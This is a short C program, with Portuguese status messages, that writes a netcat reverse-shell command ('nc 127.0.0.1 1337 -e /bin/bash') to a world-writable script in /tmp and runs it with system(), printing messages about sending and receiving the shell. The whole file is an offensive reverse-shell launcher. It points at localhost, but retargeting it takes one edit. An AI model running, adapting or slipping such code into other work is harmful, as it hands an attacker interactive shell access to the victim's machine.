#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

int main(void){

	int arquivo = open("/tmp/shell.sh", O_RDWR|O_CREAT, 0777);
	char rce[50] = "nc 127.0.0.1 1337 -e /bin/bash\n";
	if (arquivo == -1){
		printf("erro ao criar o arquivo");
	}else{
		printf("sucesso ao criar o arquivo!\n");
		ssize_t write_rce = write(arquivo, rce, sizeof(rce));
		if (write_rce == -1){
			printf("\n[!] ERRO AO ESCREVER! %d",write_rce);
		}else{
			printf("[1337] SEND REVERSE SHELL!\n");
			sleep(2);
			int shell = system("bash /tmp/shell.sh");
			if (shell == -1){
				printf("[!] SHELL NOT SEND!");
			}else{
				printf("[#] RECEIVED SHELL!");
			}
				
		}
	}
	close(arquivo);
	return 0;
}
